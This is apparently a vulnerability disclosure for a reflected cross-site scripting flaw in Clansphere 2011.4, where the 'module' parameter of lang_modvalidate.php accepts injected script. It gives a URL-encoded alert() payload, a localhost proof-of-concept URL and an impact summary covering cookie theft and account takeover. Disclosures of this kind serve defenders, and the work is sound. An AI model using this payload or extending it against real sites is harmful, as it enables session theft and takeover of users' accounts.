Description

A cross-site scripting (XSS) issue in the Clansphere version 2011.4 allows remote attackers to inject JavaScript via the "module" Parameter
___
XSS Payload: module%27%22()%26%25%3Cyes%3E%3CScRiPt%20%3Ealert(9904)%3C/ScRiPt%3E
___
Vulnerable Parameter: module
___
Steps to Reproduce the Issue:
POC: https://localhost/clansphere/mods/clansphere/lang_modvalidate.php?language=language&module=module%27%22()%26%25%3Cyes%3E%3CScRiPt%20%3Ealert(9904)%3C/ScRiPt%3E

Screenshot:
![POC](https://user-images.githubusercontent.com/69595454/111911116-ce77f080-8a6c-11eb-8817-9554acff65db.png)

___
Impact
With the help of xss attacker can perform social engineering on users by redirecting them from real website to fake one. Attacker can steal their cookies leading to account takeover and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.
